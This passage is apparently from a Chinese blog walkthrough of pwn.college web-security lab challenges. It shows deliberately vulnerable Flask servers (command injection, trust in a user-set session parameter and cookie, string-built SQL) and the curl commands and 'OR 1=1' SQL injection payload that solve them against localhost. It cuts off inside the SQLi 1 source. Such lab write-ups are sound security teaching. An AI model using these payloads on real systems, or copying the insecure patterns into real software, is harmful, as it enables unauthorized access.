<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/opt/pwn.college/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>():</span><br><span class="line">    directory = (</span><br><span class="line">        flask.request.args.get(<span class="string">&quot;directory&quot;</span>, <span class="string">&quot;/challenge&quot;</span>)</span><br><span class="line">        .replace(<span class="string">&quot;;&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        .replace(<span class="string">&quot;&amp;&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        .replace(<span class="string">&quot;|&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        .replace(<span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        .replace(<span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        .replace(<span class="string">&quot;(&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        .replace(<span class="string">&quot;)&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        .replace(<span class="string">&quot;`&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        .replace(<span class="string">&quot;$&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    )</span><br><span class="line">    command = <span class="string">f&quot;ls -l <span class="subst">&#123;directory&#125;</span>&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;DEBUG: <span class="subst">&#123;command=&#125;</span>&quot;</span>)</span><br><span class="line">    listing = subprocess.run(</span><br><span class="line">        command,                    <span class="comment"># the command to run</span></span><br><span class="line">        shell=<span class="literal">True</span>,                 <span class="comment"># use the shell to run this command</span></span><br><span class="line">        stdout=subprocess.PIPE,     <span class="comment"># capture the standard output</span></span><br><span class="line">        stderr=subprocess.STDOUT,   <span class="comment"># 2&gt;&amp;1</span></span><br><span class="line">        encoding=<span class="string">&quot;latin&quot;</span>            <span class="comment"># capture the resulting output as text</span></span><br><span class="line">    ).stdout</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;html&gt;&lt;body&gt;</span></span><br><span class="line"><span class="string">        Welcome to the dirlister service! Please choose a directory to list the files of:</span></span><br><span class="line"><span class="string">        &lt;form&gt;&lt;input type=text name=directory&gt;&lt;input type=submit value=Submit&gt;&lt;/form&gt;</span></span><br><span class="line"><span class="string">        &lt;hr&gt;</span></span><br><span class="line"><span class="string">        &lt;b&gt;Output of: ls -l <span class="subst">&#123;directory&#125;</span>&lt;/b&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">        &lt;pre&gt;<span class="subst">&#123;listing&#125;</span>&lt;/pre&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;&lt;/html&gt;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">os.setuid(os.geteuid())</span><br><span class="line">os.environ[<span class="string">&quot;PATH&quot;</span>] = <span class="string">&quot;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span></span><br><span class="line">app.secret_key = os.urandom(<span class="number">8</span>)</span><br><span class="line">port = <span class="number">8080</span> <span class="keyword">if</span> os.geteuid() <span class="keyword">else</span> <span class="number">80</span></span><br><span class="line">app.config[<span class="string">&#x27;SERVER_NAME&#x27;</span>] = <span class="string">f&quot;challenge.localhost:<span class="subst">&#123;port&#125;</span>&quot;</span></span><br><span class="line">app.run(<span class="string">&quot;challenge.localhost&quot;</span>, port)</span><br></pre></td></tr></table></figure>

<h3 id="3-8-Authentication-Bypass-1"><a href="#3-8-Authentication-Bypass-1" class="headerlink" title="3.8 Authentication Bypass 1"></a>3.8 Authentication Bypass 1</h3><p>这里源码就已经给出解决的办法了，我们只需要传入<code>session_user=admin</code>就可以直接获取flag了，反正它又不检查密码：</p>
<p><code>curl &quot;http://challenge.localhost:80/?session_user=admin&quot;</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_get</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (username := flask.request.args.get(<span class="string">&quot;session_user&quot;</span>, <span class="literal">None</span>)):</span><br><span class="line">        page = <span class="string">&quot;&lt;html&gt;&lt;body&gt;Welcome to the login service! Please log in as admin to get the flag.&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        page = <span class="string">f&quot;&lt;html&gt;&lt;body&gt;Hello, <span class="subst">&#123;username&#125;</span>!&quot;</span></span><br><span class="line">        <span class="keyword">if</span> username == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            page += <span class="string">&quot;&lt;br&gt;Here is your flag: &quot;</span> + <span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>).read()</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/opt/pwn.college/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Don&#x27;t panic about this class. It simply implements a temporary database in which</span></span><br><span class="line"><span class="comment"># this application can store data. You don&#x27;t need to understand its internals, just</span></span><br><span class="line"><span class="comment"># that it processes SQL queries using db.execute().</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TemporaryDB</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.db_file = tempfile.NamedTemporaryFile(<span class="string">&quot;x&quot;</span>, suffix=<span class="string">&quot;.db&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">execute</span>(<span class="params">self, sql, parameters=(<span class="params"></span>)</span>):</span><br><span class="line">        connection = sqlite3.connect(self.db_file.name)</span><br><span class="line">        connection.row_factory = sqlite3.Row</span><br><span class="line">        cursor = connection.cursor()</span><br><span class="line">        result = cursor.execute(sql, parameters)</span><br><span class="line">        connection.commit()</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">db = TemporaryDB()</span><br><span class="line"><span class="comment"># https://www.sqlite.org/lang_createtable.html</span></span><br><span class="line">db.execute(<span class="string">&quot;&quot;&quot;CREATE TABLE users AS SELECT &quot;admin&quot; AS username, ? as password&quot;&quot;&quot;</span>, [os.urandom(<span class="number">8</span>)])</span><br><span class="line"><span class="comment"># https://www.sqlite.org/lang_insert.html</span></span><br><span class="line">db.execute(<span class="string">&quot;&quot;&quot;INSERT INTO users SELECT &quot;guest&quot; as username, &quot;password&quot; as password&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_post</span>():</span><br><span class="line">    username = flask.request.form.get(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">    password = flask.request.form.get(<span class="string">&quot;password&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> username:</span><br><span class="line">        flask.abort(<span class="number">400</span>, <span class="string">&quot;Missing `username` form parameter&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> password:</span><br><span class="line">        flask.abort(<span class="number">400</span>, <span class="string">&quot;Missing `password` form parameter&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># https://www.sqlite.org/lang_select.html</span></span><br><span class="line">    user = db.execute(<span class="string">&quot;SELECT rowid, * FROM users WHERE username = ? AND password = ?&quot;</span>, (username, password)).fetchone()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user:</span><br><span class="line">        flask.abort(<span class="number">403</span>, <span class="string">&quot;Invalid username or password&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.redirect(<span class="string">f&quot;&quot;&quot;<span class="subst">&#123;flask.request.path&#125;</span>?session_user=<span class="subst">&#123;username&#125;</span>&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_get</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (username := flask.request.args.get(<span class="string">&quot;session_user&quot;</span>, <span class="literal">None</span>)):</span><br><span class="line">        page = <span class="string">&quot;&lt;html&gt;&lt;body&gt;Welcome to the login service! Please log in as admin to get the flag.&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        page = <span class="string">f&quot;&lt;html&gt;&lt;body&gt;Hello, <span class="subst">&#123;username&#125;</span>!&quot;</span></span><br><span class="line">        <span class="keyword">if</span> username == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            page += <span class="string">&quot;&lt;br&gt;Here is your flag: &quot;</span> + <span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>).read()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> page + <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;hr&gt;</span></span><br><span class="line"><span class="string">        &lt;form method=post&gt;</span></span><br><span class="line"><span class="string">        User:&lt;input type=text name=username&gt;Pass:&lt;input type=text name=password&gt;&lt;input type=submit value=Submit&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;&lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">app.secret_key = os.urandom(<span class="number">8</span>)</span><br><span class="line">port = <span class="number">8080</span> <span class="keyword">if</span> os.geteuid() <span class="keyword">else</span> <span class="number">80</span></span><br><span class="line">app.config[<span class="string">&#x27;SERVER_NAME&#x27;</span>] = <span class="string">f&quot;challenge.localhost:<span class="subst">&#123;port&#125;</span>&quot;</span></span><br><span class="line">app.run(<span class="string">&quot;challenge.localhost&quot;</span>, port)</span><br></pre></td></tr></table></figure>

<h3 id="3-9-Authentication-Bypass-2"><a href="#3-9-Authentication-Bypass-2" class="headerlink" title="3.9 Authentication Bypass 2"></a>3.9 Authentication Bypass 2</h3><p>发送带有伪造的 Cookie 的请求，就可以解决问题了<code>curl --cookie &quot;session_user=admin&quot; http://challenge.localhost:80/</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/opt/pwn.college/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TemporaryDB</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.db_file = tempfile.NamedTemporaryFile(<span class="string">&quot;x&quot;</span>, suffix=<span class="string">&quot;.db&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">execute</span>(<span class="params">self, sql, parameters=(<span class="params"></span>)</span>):</span><br><span class="line">        connection = sqlite3.connect(self.db_file.name)</span><br><span class="line">        connection.row_factory = sqlite3.Row</span><br><span class="line">        cursor = connection.cursor()</span><br><span class="line">        result = cursor.execute(sql, parameters)</span><br><span class="line">        connection.commit()</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">db = TemporaryDB()</span><br><span class="line"><span class="comment"># https://www.sqlite.org/lang_createtable.html</span></span><br><span class="line">db.execute(<span class="string">&quot;&quot;&quot;CREATE TABLE users AS SELECT &quot;admin&quot; AS username, ? as password&quot;&quot;&quot;</span>, [os.urandom(<span class="number">8</span>)])</span><br><span class="line"><span class="comment"># https://www.sqlite.org/lang_insert.html</span></span><br><span class="line">db.execute(<span class="string">&quot;&quot;&quot;INSERT INTO users SELECT &quot;guest&quot; as username, &quot;password&quot; as password&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_post</span>():</span><br><span class="line">    username = flask.request.form.get(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">    password = flask.request.form.get(<span class="string">&quot;password&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> username:</span><br><span class="line">        flask.abort(<span class="number">400</span>, <span class="string">&quot;Missing `username` form parameter&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> password:</span><br><span class="line">        flask.abort(<span class="number">400</span>, <span class="string">&quot;Missing `password` form parameter&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># https://www.sqlite.org/lang_select.html</span></span><br><span class="line">    user = db.execute(<span class="string">&quot;SELECT rowid, * FROM users WHERE username = ? AND password = ?&quot;</span>, (username, password)).fetchone()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user:</span><br><span class="line">        flask.abort(<span class="number">403</span>, <span class="string">&quot;Invalid username or password&quot;</span>)</span><br><span class="line"></span><br><span class="line">    response = flask.redirect(flask.request.path)</span><br><span class="line">    response.set_cookie(<span class="string">&#x27;session_user&#x27;</span>, username)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_get</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (username := flask.request.cookies.get(<span class="string">&quot;session_user&quot;</span>, <span class="literal">None</span>)):</span><br><span class="line">        page = <span class="string">&quot;&lt;html&gt;&lt;body&gt;Welcome to the login service! Please log in as admin to get the flag.&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        page = <span class="string">f&quot;&lt;html&gt;&lt;body&gt;Hello, <span class="subst">&#123;username&#125;</span>!&quot;</span></span><br><span class="line">        <span class="keyword">if</span> username == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            page += <span class="string">&quot;&lt;br&gt;Here is your flag: &quot;</span> + <span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>).read()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> page + <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;hr&gt;</span></span><br><span class="line"><span class="string">        &lt;form method=post&gt;</span></span><br><span class="line"><span class="string">        User:&lt;input type=text name=username&gt;Pass:&lt;input type=text name=password&gt;&lt;input type=submit value=Submit&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;&lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">app.secret_key = os.urandom(<span class="number">8</span>)</span><br><span class="line">port = <span class="number">8080</span> <span class="keyword">if</span> os.geteuid() <span class="keyword">else</span> <span class="number">80</span></span><br><span class="line">app.config[<span class="string">&#x27;SERVER_NAME&#x27;</span>] = <span class="string">f&quot;challenge.localhost:<span class="subst">&#123;port&#125;</span>&quot;</span></span><br><span class="line">app.run(<span class="string">&quot;challenge.localhost&quot;</span>, port)</span><br></pre></td></tr></table></figure>

<h3 id="3-9-SQLi-1"><a href="#3-9-SQLi-1" class="headerlink" title="3.9 SQLi 1"></a>3.9 SQLi 1</h3><p>观察代码后我们发现需要注入的地方是向服务器发送POST请求的SQL注入<code>query = f&#39;SELECT rowid, * FROM users WHERE username = &quot;&#123;username&#125;&quot; AND pin = &#123;pin&#125;&#39;</code></p>
<p>因此我们可以构造<code>SELECT * FROM users WHERE username = &#39;admin&#39; AND pin = &#39;&#39; 1 OR 1=1 --&#39;&#39;</code></p>
<p>这是因为SQL的运算优先级时准讯标准的逻辑运算优先级的，AND的优先级高于OR</p>
<p><code>SELECT * FROM users WHERE username = &#39;admin&#39; AND pin = 1 OR 1=1</code> 实际执行的顺序是</p>
<p><code>SELECT * FROM users WHERE (username = &#39;admin&#39; AND pin = 1) OR (1=1)</code>，返回的结果始终为真。</p>
<p>所以我们执行<code>curl -c cookies.txt -X POST http://challenge.localhost -d &quot;username=admin&amp;pin=1%20OR%201=1%20%20--&quot;</code>登陆请求并保存<code>cookies.txt</code></p>
<p>然后使用保存的 Cookie 发出 GET 请求获取flag <code>curl -b cookies.txt http://challenge.localhost</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/opt/pwn.college/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TemporaryDB</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 创建一个临时数据库文件</span></span><br><span class="line">        self.db_file = tempfile.NamedTemporaryFile(<span class="string">&quot;x&quot;</span>, suffix=<span class="string">&quot;.db&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">execute</span>(<span class="params">self, sql, parameters=(<span class="params"></span>)</span>):</span><br><span class="line">        <span class="comment"># 执行 SQL 查询</span></span><br><span class="line">        connection = sqlite3.connect(self.db_file.name)</span><br><span class="line">        connection.row_factory = sqlite3.Row  <span class="comment"># 以字典形式返回行</span></span><br><span class="line">        cursor = connection.cursor()</span><br><span class="line">        result = cursor.execute(sql, parameters)</span><br><span class="line">        connection.commit()  <span class="comment"># 提交事务</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">db = TemporaryDB()</span><br><span class="line"><span class="comment"># 创建一个包含 admin 用户的表，PIN 为随机生成的值</span></span><br><span class="line">db.execute(<span class="string">&quot;&quot;&quot;CREATE TABLE users AS SELECT &quot;admin&quot; AS username, ? as pin&quot;&quot;&quot;</span>, [random.randrange(<span class="number">2</span>**<span class="number">32</span>, <span class="number">2</span>**<span class="number">63</span>)])</span><br><span class="line"><span class="comment"># 插入一个 guest 用户，PIN 为 1337</span></span><br><span class="line">db.execute(<span class="string">&quot;&quot;&quot;INSERT INTO users SELECT &quot;guest&quot; as username, 1337 as pin&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_post</span>():</span><br><span class="line">    <span class="comment"># 处理 POST 请求以进行登录</span></span><br><span class="line">    username = flask.request.form.get(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">    pin = flask.request.form.get(<span class="string">&quot;pin&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 检查请求参数</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> username:</span><br><span class="line">        flask.abort(<span class="number">400</span>, <span class="string">&quot;Missing `username` form parameter&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> pin:</span><br><span class="line">        flask.abort(<span class="number">400</span>, <span class="string">&quot;Missing `pin` form parameter&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 检查 PIN 是否为数字</span></span><br><span class="line">    <span class="keyword">if</span> pin[<span class="number">0</span>] <span class="keyword">not</span> <span class="keyword">in</span> <span class="string">&quot;0123456789&quot;</span>:</span><br><span class="line">        flask.abort(<span class="number">400</span>, <span class="string">&quot;Invalid pin&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 构造 SQL 查询以验证用户</span></span><br><span class="line">        query = <span class="string">f&#x27;SELECT rowid, * FROM users WHERE username = &quot;<span class="subst">&#123;username&#125;</span>&quot; AND pin = <span class="subst">&#123;pin&#125;</span>&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;DEBUG: <span class="subst">&#123;query=&#125;</span>&quot;</span>)</span><br><span class="line">        user = db.execute(query).fetchone()  <span class="comment"># 执行查询并获取结果</span></span><br><span class="line">    <span class="keyword">except</span> sqlite3.Error <span class="keyword">as</span> e:</span><br><span class="line">        flask.abort(<span class="number">500</span>, <span 